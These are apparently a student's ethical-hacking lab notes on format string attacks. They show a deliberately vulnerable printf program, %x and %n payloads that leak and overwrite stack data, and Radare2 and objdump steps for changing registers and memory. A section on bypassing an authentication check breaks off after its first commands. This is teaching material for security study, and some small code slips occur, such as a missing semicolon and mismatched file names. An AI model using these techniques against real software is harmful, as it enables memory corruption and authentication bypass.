# EHD Practical 15 - Format String Attack

###### tags: #EHD 

## Table of Contents
```toc
```

## Looking at Stack Contents Through Format String Attacks
**On Win10 VM**
1. Create the following C program called `formatstr.c`
```c
#include <stdio.h>
int main(int argc, char *argv[]) {
	printf(argv[1])
	return 0;
}
```

2. Compile the program
```
gcc -o formatstr1 formatstr1.c
```

3. Run the program with the argument `hello`
```
./formatstr1 hello
```

4. Run the program with the argument `hello%s`
```
./formatstr1 hello%s
```

5. Run the program with the argument `hello%08x`
```
./formatstr1 hello%08x
```

6. The data that appears after the string `hello` comes from the top of the stack
7. To see more of the stack, run the program with more format parameters
```
./formatstr1 %08x.%08x.%08x.%08x
```

8. To see even more content from the stack, use a Perl or Python script to generate the format parameters
```
./formatstr1 $(perl -e 'print "%08x." x 40')
./formatstr1 $(python2.7 -c 'print("%08x" * 40)')
./formatstr1 $(python3.6 -c 'print("%08x" * 40)')
```

## Format Parameter %n
> The format parameter %n will write the number of characters that have been written by the function so far to the specified variable address

**On Win10 VM**
1. Create the following C program `formatstr2.c`
```c
int main() {
	int count;
	printf("12345%n\n", &count);
	printf("Count: %d\n", count);
	return 0;
}
```

2. Compile and run the program without parameters. Count should have the value 5
3. Edit the program to add the following two lines:
```c
int main() {
	int count;
	printf("12345%n\n", &count);
	printf("Count: %d\n", count);
	printf("12345 67890%n\n",&count);
	printf("Count :%d\n", count);
	return 0;
}
```

4. Compile and run the program without parameters. The variable count should have the values 5 and 11
5. Edit the program to remove `&count` from the third line
```c
int main() {
	int count;
	printf("12345%n\n", &count);
	printf("Count: %d\n", count);
	printf("12345 67890%n\n"); // remove &count
	printf("Count :%d\n", count);
	return 0;
}
```

6. Run the program without parameters. The program will attempt to write the number 11 into the address at the top of the stack. This may cause the program to crash

## Using Format String Vulnerabilities to Change the Values of Local Variables
1. Create the following C program `formatstr3.c`
```c
#include <stdio.h>

int functionA(char *buffer, char *inputstring) {
  printf("address of buffer %x\n",buffer);
  printf("buffer %s\n", buffer);
  printf(inputstring);
  printf("\naddress of buffer %x\n",buffer);
  printf("buffer %s\n", buffer);
  return 0;
}

int main(int argc, char *argv[]) {
  char buffer[10] = "Goodbye";
  functionA(buffer, argv[1]);
  return 0;
}
```

2. Compile and run the program with the argument `Hello`
```
gcc -o formatstr3 formatstr3.c
./formatstr3 Hello
```

3. You may get output like the following:
```
address of buffer ffffcc26
buffer Goodbye
Hello
address of buffer ffffcc26
buffer Goodbye
```

4. Run the program with the arguments `%x.%x.%x.%x.%x.%x.%x` to get the top 7 words from the stack
```
./formatstr3 %x.%x.%x.%x.%x.%x.%x
```

5. You may get the following output:
```
address of buffer ffffcc26
buffer Goodbye
0.ffffc934.0.ffffcc30.401126.ffffcc26.8036a4689
address of buffer ffffcc26
buffer Goodbye
```

6. Change the number of `%x` so that the address of the buffer is the last word to be displayed
7. Change the last `%x` to `%n` so that instead of `%x` which will display the current word in the stack, `%n` will write something to the address contained in the current word of the stack
```
./formatstr3 %x.%x.%x.%x.%x.%n
```
8. You may get the following output:
```
address of buffer bfc8a902
buffer Goodbye
0.ffffc934.0.ffffcc30.401126.
address of buffer bfc8a902
buffer
```

9. We have changed the variable buffer to an empty string
10. To change the buffer to an exclamation mark, find its ASCII value 
11. Count the number of characters that is printed out by the program line vulnerable to the format string attack `printf(inputstring)`
```
# 29 characters are printed in this line
address of buffer bfc8a902
buffer Goodbye
0.ffffc934.0.ffffcc30.401126.
address of buffer bfc8a902
buffer 
```

12. Run the program with the same number of `%x` but add four more characters so that the line printed out will be 33 characters long
13. The last `%n` will write the number of characters printed out to the address contained in the current word of the stack
```
./formatstr3 %x.%x.%x.%x.%x.1234%n
```

## Using Radare2 to Debug Programs
**On Kali VM**
1. Examine the C program called `doublevalue.c`
```c
#include <stdio.h>
int doublevalue(int num) {
  int c;
  c = num * 2;
  return(c);
}

void main() {
  int a, b;
  a = 4;
  printf("The value of a is %d\n", a);
  b = doublevalue(a);
  printf("The value of b is %d\n", b);
}
```

2. Compile the program and run the program to test it
```
gcc doublevalue doublevalue.c
./doublevalue
```

3. Use Radare2 to debug the program
```
r2 -d doublevalue
```

4. Run the following command to analyse the program and auto name functions
```
aaa
```

5. In Radare2, use the `?` key to display help and list of possible commands
6. `p` key is used to print values - run `p?` to print values
7. Use `s` to move to the main function
8. Type `pdf` to print disassembled functions

![](https://i.imgur.com/tS62Wmk.png)

9. Type `db main` to put a breakpoint at the start of the function
10. Type `db <address_function>`  to put a breakpoint at the address of the `printf` function
11. Put a third breakpoint `db sym.doublevalue` at the start of the `doublevalue` function
12. Type `dc` to run the program. It will stop at the breakpoints
13. Type `pdf` to display the assembly code again. Address of the instruction of where the program has paused is highlighted and the address where the letter "b" is located indicates where the breakpoints are

![](https://i.imgur.com/N6ntrSK.png)

14. Type `dr` to display the current contents of the register

> Note that the RIP contains the address of the next instruction to run

![](https://i.imgur.com/uTYktis.png)

15. From the assembly code, we can guess that the variable `a` is called `[var_4h]` and it is at the address `rbp-0x4`
16. Type the following command to print the current content of variable `a` in hexadecimal
```
px4 @rbp-0x4
```
17. Type `dc` to continue running the program
18. When it reaches the second breakpoint at the first `printf` instruction, it will pause
19. Display the current content of the variable `a`. It has been initialised with the value of 4
```
px4 @rbp-0x4
```

![](https://i.imgur.com/BB2p267.png)

20. Type `dc` to continue running. When it reaches the start of `doublevalue` function, it will hit the third breakpoint and pause
21. Type `pdf` to display the assembly code of the `doublevalue` function

![](https://i.imgur.com/xnYqpKf.png)

22. Type `dc` to continue running the program till it ends
23. Type `q` to exit Radare2

## Using the Debugger to Change the Instruction Pointer Register
**On Kali VM**
1. Use Radare2 to debug the `doublevalue` program
```
r2 -d doublevalue
```

2. In Radare2, run the following command to analyse the program and auto name functions
```
aaa
```

3. Put a breakpoint on the `doublevalue` function
```
db sym.doublevalue
```

4. Run the program until it reaches the breakpoint at the start of the `doublevalue` function
```
dc
```

5. View the assembly code of the `doublevalue` function
```
pdf
```
![](https://i.imgur.com/s5R6Mej.png)

6. Run the following command to run the next instruction and step over to the following instruction
```
dso
```

7. Run the instructions until the start of the `add eax, eax` instruction
![](https://i.imgur.com/Nb2IKxf.png)

8. Take note of the address after `add eax, eax`
9. Run the following command to change the RIP register to skip the add instruction
```
dr rip = 0x5619f085b141
```

10. Type `dc` to run the rest of the program
11. Type `q` to exit Radare2

## Using the Debugger to Change Memory Values
**On Kali VM**
1. Instead of putting a breakpoint, `dcu` can be used to continue running until the specified address or flag
```
dcu 0x55d946340169
```

2. Run the following command to write the hexadecimal value 07 to variable `a`
```
wx 07 @rbp-0x4
```

3. Run the following command to read the contents of variable `a`
```
px4 @rbp-0x4
```
![](https://i.imgur.com/gbNZ0gJ.png)

4. Type `dc` to run the rest of the program

> In addition to Radare2, `objdump` can also be used to get more information about a binary file

5. Type `man objdump` to view the man page for the command
6. Disassemble the `doublevalue` program
```
objdump -d doublevalue
```

![](file:///C:/Users/ervin/AppData/Local/Temp/msohtmlclip1/01/clip_image002.gif)

7. Use `objdump` to display the symbol table for the `doublevalue` program
```
objdump -t doublevalue
```

8. Use the Rabin2 command to display strings from the data section of the `doublevalue` program
```
rabin2 -z doublevalue
```

9. The strings command will display strings from all the sections of the `doublevalue` program
```
strings doublevalue
```

## Using the Debugger to Bypass Authentication Checks or View Passwords
**On Kali VM**
1. Set executable permissions for `getcode`
```
chmod a+x getcode
```

2. Run the program `getcode`
```
./getcode
```

3. Use `objdump` too see the names of the functions inside `getcode`
```
objdump -t getcode
```
![](https://i.imgur.com/RQf7n9p.png)

